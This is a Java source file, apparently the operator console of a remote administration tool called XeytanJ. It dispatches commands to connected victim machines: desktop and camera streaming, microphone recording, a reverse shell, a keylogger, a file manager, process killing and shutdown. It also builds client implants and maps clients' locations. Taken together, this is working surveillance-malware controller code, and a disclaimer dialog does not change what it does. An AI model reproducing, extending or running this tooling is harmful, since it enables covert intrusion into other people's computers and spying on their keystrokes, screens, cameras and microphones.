package com.melardev.xeytanj;

import com.melardev.xeytanj.enums.*;
import com.melardev.xeytanj.errors.IOStorageException;
import com.melardev.xeytanj.gui.disclaimer.DisclaimerUiListener;
import com.melardev.xeytanj.gui.info.ClientInfoUiListener;
import com.melardev.xeytanj.gui.installer.InstallerUiListener;
import com.melardev.xeytanj.gui.language.LanguageUiListener;
import com.melardev.xeytanj.gui.main.MainUiListener;
import com.melardev.xeytanj.gui.mediator.IUiMediator;
import com.melardev.xeytanj.maps.ClientGeoStructure;
import com.melardev.xeytanj.models.*;
import com.melardev.xeytanj.net.packets.voice.PacketVoice;
import com.melardev.xeytanj.services.IAppMessageProvider;
import com.melardev.xeytanj.services.builder.IClientBuilder;
import com.melardev.xeytanj.services.config.ConfigService;
import com.melardev.xeytanj.services.config.IConfigService;
import com.melardev.xeytanj.services.data.IStorageService;
import com.melardev.xeytanj.services.ioc.DependencyResolverFactory;
import com.melardev.xeytanj.services.ioc.IAppDependencyResolver;
import com.melardev.xeytanj.services.ioc.SpiResolver;
import com.melardev.xeytanj.services.logger.ILogger;
import com.melardev.xeytanj.services.net.INetworkServerService;
import com.melardev.xeytanj.services.net.RemoteClient;
import com.melardev.xeytanj.support.MessageDialogFactory;

import javax.swing.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class XeytanJApplication implements IApplication, MainUiListener, ClientInfoUiListener,
        DisclaimerUiListener, InstallerUiListener, LanguageUiListener {

    private static IApplication selfInstance;
    private final ExecutorService threadPool;
    private final IStorageService storage;
    //private SpringBeansResolver serviceLocator;
    private IAppDependencyResolver serviceLocator;
    private IUiMediator mediator;
    private INetworkServerService networkServerService;
    private IConfigService config;
    private ILogger logger;
    private IAppMessageProvider messageProvider;


    public XeytanJApplication() {
        selfInstance = this;
        serviceLocator = DependencyResolverFactory.getDependencyResolver();

        logger = serviceLocator.lookup(ILogger.class);
        config = serviceLocator.lookup(IConfigService.class);
        messageProvider = serviceLocator.lookup(IAppMessageProvider.class);
        storage = serviceLocator.lookup(IStorageService.class);
        mediator = serviceLocator.lookup(IUiMediator.class);

        storage.setLogger(logger);
        mediator.setLogger(logger);
        mediator.setApplication(this);
        mediator.setMessageProvider(messageProvider);
        ((ConfigService) config).setStorage(storage);

        threadPool = Executors.newCachedThreadPool();

        Runtime.getRuntime().addShutdownHook(new Thread() {
            @Override
            public void run() {
                cleanup();
            }
        });
    }

    public static IApplication getInstance() {
        return selfInstance;
    }

    private void showUiAndInitNetSubsystem() {
        mediator.showMainFrame(this);
        initNetSubsystem();
    }

    private void initNetSubsystem() {
        networkServerService = serviceLocator.lookup(INetworkServerService.class);
        networkServerService.setApplication(this);
        networkServerService.setLogger(logger);
        networkServerService.setConfig(config);
        networkServerService.initServer();
    }

    public void run() {

        logger.traceCurrentMethodName();

        if (config.hasAcceptedDisclaimer()) {
            Language lang = config.getPreferredLanguage();

            if (lang == null) {
                mediator.showLanguageSelectorDialog();
                return;
            } else {
                messageProvider.setLocaleForLanguage(lang);
            }
/*
            if (!config.hasGoneThroughInstallation()) {
                // There is nothing tot install actually, this code was used
                // in the past when I used MySQL, now I use H2 which is embedded
                mediator.showInstaller();
                return;
            }
*/
            showUiAndInitNetSubsystem();
        } else {
            mediator.showDisclaimerDialog();
        }
    }

    private void cleanup() {

    }

    @Override
    public void onDisposeError(String message) {
        logger.traceCurrentMethodName();
        //SpringBeansResolver serviceLocator = SpringBeansResolver.getInstance();
        serviceLocator = SpiResolver.getInstance();
        mediator = serviceLocator.lookup(IUiMediator.class);
        mediator.showDialogMessageError(message);
    }

    public ArrayList<Client> getLocations() {
        ArrayList<Client> locations = new ArrayList<>();
        //getAllDependencies from DB before so when the map is created , the marker on top will be from the connected clients
        //and not from the DB which may be disconnected
        IStorageService storage = serviceLocator.lookup(IStorageService.class);
        locations.addAll(storage.getAllClients());

        locations.addAll(networkServerService.getAllClients());
        return locations;
    }

    // ==============================================================================================
    // Callbacks triggered from UiMediator
    // ==============================================================================================
    @Override
    public void onWindowUserOwnedClosed(Client client, ServiceType serviceType) {
        RemoteClient remote = networkServerService.getRemoteClientFromClientId(client.getId());
        if (remote == null)
            return;
        if (serviceType == ServiceType.REMOTE_DESKTOP) {
            if (remote.getClientContext().getNetClientService().isDesktopServiceActive(client))
                networkServerService.stopRemoteDesktop(client);
        } else if (serviceType == ServiceType.LIST_PROCESS) {
            if (remote.getClientContext().getNetClientService().isListProcessActive())
                networkServerService.stopProcessMonitor(client);
        } else if (serviceType == ServiceType.CAMERA) {
            if (remote.getClientContext().getNetClientService().isCameraServiceActive(client))
                networkServerService.stopCameraSession(client);
        } else if (serviceType == ServiceType.REVERSE_SHELL) {
            networkServerService.stopShellSession(client);
        }
    }

    @Override
    public void onRemoteDesktopClicked(UUID uuid) {
        threadPool.execute(() -> networkServerService.startRemoteDesktop(uuid));
    }

    @Override
    public void onRemoteDesktopPauseRequested(Client client) {
        logger.traceCurrentMethodName();
        if (networkServerService.isClientStreamingDesktop(client))
            networkServerService.pauseRemoteDesktop(client);
        else
            logger.errorFormat("%s is not streaming desktop", client.getPcName());

    }

    @Override
    public void onRemoteDesktopPlayRequested(Client client, NetworkProtocol networkProtocol, String displayName, int scaleX, int scaleY, int delay) {
        logger.traceCurrentMethodName();
        MediaState mediaState = networkServerService.getDesktopMediaState(client);
        if (mediaState == MediaState.WAITING_DEVICE_SELECTION || mediaState == MediaState.PAUSED || mediaState == MediaState.STOPPED)
            threadPool.execute(() -> networkServerService.playRemoteDesktop(client, networkProtocol, displayName, delay, scaleX, scaleY));
    }

    @Override
    public void onRemoteDesktopStopRequested(Client client) {
        logger.traceCurrentMethodName();
        networkServerService.stopRemoteDesktop(client);
    }

    @Override
    public void onRemoteDesktopSessionClosed(RemoteClient remoteClient) {
        logger.traceCurrentMethodName();
        //mediator.closeRemoteDesktopWindow(remoteClient.getClientId());
    }

    // =================
    // Camera
    // =================

    @Override
    public void onCameraStartRequested(NetworkProtocol networkProtocol, UUID uuid) {
        threadPool.execute(() -> networkServerService.startCameraSession(networkProtocol, uuid));
    }

    @Override
    public void onRemoteCameraPlayRequested(Client client, NetworkProtocol protocol, int cameraId, boolean muteAudio, int interval) {
        threadPool.execute(() -> networkServerService.playRemoteCamera(protocol, client, cameraId, muteAudio, interval));
    }

    @Override
    public void onCameraPauseRequested(Client client) {
        networkServerService.pauseCameraStreaming(client);
    }

    // =================
    // FileSystem
    // =================

    @Override
    public void onRemoteFileManagerClicked(UUID uuid) {
        threadPool.execute(() -> networkServerService.startFileManager(uuid));
    }

    @Override
    public void onFileSystemPathRequested(Client client, String fileSystemPath) {
        threadPool.execute(() -> networkServerService.getFileSystemView(client, fileSystemPath));
    }

    @Override
    public void onProcessListClicked(ProcessInfoDetails infoLevel, UUID uuid) {
        threadPool.execute(() -> networkServerService.startListProcess(ProcessInfoDetails.BASIC, uuid));
    }

    public void onRemoteShellClicked(UUID uuid) {
        threadPool.execute(() -> networkServerService.startShellSession(uuid));
    }

    @Override
    public void onTurnOnOffDisplayClicked(UUID uuid, boolean on) {
        threadPool.execute(() -> networkServerService.startTurnDisplay(uuid, on));
    }

    @Override
    public void onProcessKillRequest(Client client, int pid) {
        networkServerService.killProcess(client, pid);
    }

    @Override
    public void onSendShellCommandRequested(Client client, String command) {
        networkServerService.sendShellCommand(client, command);
    }

    @Override
    public void onSendChatMessage(Client client, String text) {
        networkServerService.sendChatMessage(client, text);
    }

    @Override
    public void onShowClientInfo(UUID uuid) {
        threadPool.execute(() -> networkServerService.getClientInfo(uuid));
    }

    @Override
    public void onRemoteShellRequested(UUID uuid) {
        threadPool.execute(() -> networkServerService.startShellSession(uuid));
    }

    public void onRebootClicked(UUID uuid) {
        threadPool.execute(() -> networkServerService.startRebootSystem(uuid));
    }

    @Override
    public void onShutdownClicked(UUID uuid) {
        threadPool.execute(() -> networkServerService.startShutDownSystem(uuid));
    }

    @Override
    public void onLogOffSystem(UUID uuid) {
        threadPool.execute(() -> networkServerService.startLogOffSystem(uuid));
    }

    @Override
    public void onLockSystemClicked(UUID uuid) {
        threadPool.execute(() -> networkServerService.startLockSystem(uuid));
    }

    @Override
    public void onSessionKeyloggerClicked(UUID uuid) {
        threadPool.execute(() -> networkServerService.startKeyloggerSession(uuid));
    }

    @Override
    public void onVoIpRawClicked(UUID uuid) {
        threadPool.execute(() -> networkServerService.startAudioRecording(uuid, PacketVoice.Mode.RAW));
    }

    @Override
    public void onVoIpClicked(UUID uuid) {
        threadPool.execute(() -> networkServerService.startAudioRecording(uuid, PacketVoice.Mode.FILE));
    }

    @Override
    public void onBuilderShowClicked() {
        mediator.showBuilderWindow(config.getDefaultClientPath());
    }

    @Override
    public void onPreferencesClicked() {

    }

    @Override
    public void onCloseConnectionClicked(UUID uuid) {
        threadPool.execute(() -> networkServerService.closeConnection(uuid));
    }

    @Override
    public void onUninstallClicked(UUID uuid) {
        RemoteClient remoteClient = networkServerService.getRemoteClientFromClientId(uuid);
        if (remoteClient == null) return;

        threadPool.execute(() -> networkServerService.requestUninstallServer(remoteClient.getClient()));
        mediator.onClientDisconnected(remoteClient.getClient());
    }

    @Override
    public void onStartChatRequested(UUID uuid) {
        RemoteClient rc = networkServerService.getRemoteClientFromClientId(uuid);
        if (rc == null) return;
        Client client = rc.getClient();
        threadPool.execute(() -> networkServerService.startChat(uuid));
        mediator.showChatWindow(client);
    }

    @Override
    public void onChatClosed(RemoteClient remoteClient) {
        mediator.disableChat(remoteClient.getClient());
    }


    @Override
    public void onDisclaimerAccepted() {
        Language lang = config.getPreferredLanguage();
        config.setHasAcceptedDisclaimer(true);
        if (lang != null) {
            messageProvider.setLocaleForLanguage(lang);
            showUiAndInitNetSubsystem();
        } else
            showLanguagePickerWindow();
    }

    private void showLanguagePickerWindow() {
        mediator.showLanguageSelectorDialog();
    }

    @Override
    public void onDisclaimerRefused() {
        System.exit(0);
    }

    @Override
    public void onExitRequested() {

    }

    @Override
    public void onTestConnection(DbType dbType, String host, Long port, String username, String password) {

    }

    @Override
    public void onLanguageSelected(Language lang) {
        messageProvider.setLocaleForLanguage(lang);
        config.setLanguage(lang);
        showUiAndInitNetSubsystem();
    }

    @Override
    public void onLanguageUiClosed() {
        System.exit(0);
    }

    @Override
    public void onBuildClientRequested(BuildClientInfoStructure buildClientInfoStructure) {
        IClientBuilder builder = serviceLocator.lookup(IClientBuilder.class);
        boolean success = builder.build(buildClientInfoStructure);

        if (success)
            mediator.closeBuilderUi();
    }

    @Override
    public void onShowMapRequested() {
        ArrayList<Client> clients = new ArrayList<>();
        clients.addAll(storage.getAllClients());
        clients.addAll(networkServerService.getAllClients());
        // Some fake clients

        Client client = new Client(UUID.randomUUID());
        client.setGeoData(new ClientGeoStructure("Paris", "France", 0.2, 2.2));
        clients.add(client);

        client = new Client(UUID.randomUUID());
        client.setGeoData(new ClientGeoStructure(
                "Madrid", "Spain", 0.2, 2.2));
        clients.add(client);

        client = new Client(UUID.randomUUID());
        client.setGeoData(new ClientGeoStructure("Berlin", "Germany", 0.2, 2.2));
        clients.add(client);

        mediator.showMap(config.getGoogleMapsKey(), clients);
    }

    // ==============================================================================================
    // Callbacks triggered from NetClientService
    // ==============================================================================================
    @Override
    public void onRemoteCameraConfigInfoReceived(RemoteClient remoteClient, List<CameraDeviceInfo> cameraIds) {
        logger.traceCurrentMethodName();
        mediator.showOrUpdateRemoteCameraUi(remoteClient.getClient(), cameraIds);
    }

    @Override
    public void onCameraPacketReceived(RemoteClient remoteClient, Icon image) {
        mediator.showOrUpdateRemoteCameraUi(remoteClient.getClient(), image);
    }

    @Override
    public void onFilesystemRootInfoReceived(RemoteClient remoteClient, FileInfoStructure[] fileInfoStructures) {
        mediator.showRoots(remoteClient.getClient(), fileInfoStructures);
    }

    @Override
    public void onClientLoggedIn(RemoteClient remoteClient) {
        logger.traceCurrentMethodName();
        if (config.usingDb()) {

            try {
                storage.insertClient(remoteClient.getClient());
            } catch (IOStorageException e) {
                MessageDialogFactory.showErrorMessageAsync(
                        "Database Error",
                        e.getLocalizedMessage());
            }
        }
        mediator.addClientRowTable(remoteClient.getClient());
    }

    @Override
    public void onClientDisconnected(RemoteClient remoteClient) {
        logger.traceCurrentMethodName();
        mediator.onClientDisconnected(remoteClient.getClient());
        //mediator.removeAllWindowsFromUser(remoteClient.getClientId());
    }

    @Override
    public void onClientPresented(RemoteClient client, Map<String, String> env, Map<String, String> properties) {
        mediator.showClientInfo(client.getClient(), env, properties);
    }


    @Override
    public void onRemoteDesktopInfoReceived(RemoteClient remoteClient, ImageIcon image) {
        logger.traceCurrentMethodName();
        mediator.updateRemoteDesktopWindow(remoteClient.getClient(), image);
    }

    @Override
    public void onRemoteDesktopConfigInfoReceived(RemoteClient remoteClientFromId, List<ScreenDeviceInfo> config) {
        logger.traceCurrentMethodName();
        mediator.showOrUpdateRemoteDesktopConfigInfo(remoteClientFromId.getClient(), config);
    }

    @Override
    public void onFileSystemInfoUpdate(RemoteClient remoteClient, FileInfoStructure[] fileInfoStructures) {
        mediator.updateFileSystemView(remoteClient.getClient(), fileInfoStructures);
    }

    @Override
    public void onClientReadyForShell(RemoteClient remoteClientFromId) {
        mediator.showShellWindow(remoteClientFromId.getClient());
    }

    public void onShellOutputReceived(RemoteClient remoteClient, String text) {
        mediator.appendShellOutput(remoteClient.getClient(), text);
    }

    @Override
    public void onKeylogSessionClosed(RemoteClient remoteClientFromId) {

    }


    @Override
    public void onProcessInfoReceived(RemoteClient remoteClient, List<ProcessStructure> processStructures) {
        mediator.updateProcessInfoWindow(remoteClient.getClient(), processStructures);
    }


    @Override
    public void onClientShellInfoReceived(RemoteClient remoteClientFromId, String output) {
        mediator.appendShellOutput(remoteClientFromId.getClient(), output);
    }

    @Override
    public void onShellSessionClosedByUser(RemoteClient remoteClientFromId) {
        mediator.notifyShellWindowDisconnectedForClient(remoteClientFromId.getClient());
    }

    @Override
    public void onProcessSessionClosed(RemoteClient remoteClient) {

    }

    @Override
    public void onClientReadyForFileExplorerSession(RemoteClient remoteClientFromId) {
        mediator.showFileExplorerWindow(remoteClientFromId.getClient());
    }

    @Override
    public void onCameraAudioPacketReceived(RemoteClient remoteClientFromId, byte[] data, int bytesRead) {
        mediator.playAudioFromCamera(remoteClientFromId.getClient(), data, bytesRead);
    }

    @Override
    public void onAudioFileReceived(RemoteClient remoteClientFromId, byte[] data) {
        mediator.playAudioFile(remoteClientFromId.getClient(), data);
    }


    @Override
    public void onChatMessageReceived(RemoteClient remoteClient, String message) {
        mediator.showChatMessage(remoteClient.getClient(), remoteClient.getPcName() + ":" + message);
    }


    @Override
    public void onCameraSessionClosed(RemoteClient remoteClientFromId) {
        mediator.notifyCameraSessionClosedForClient(remoteClientFromId.getClient());
    }


    @Override
    public void onClientReadyForChat(RemoteClient remoteClientFromId) {
        mediator.showChatWindow(remoteClientFromId.getClient());
    }


    public static void main(String[] args) {
        // Run App in a separate thread
        XeytanJApplication xeytanJApplication = new XeytanJApplication();
        xeytanJApplication.run();
    }
}
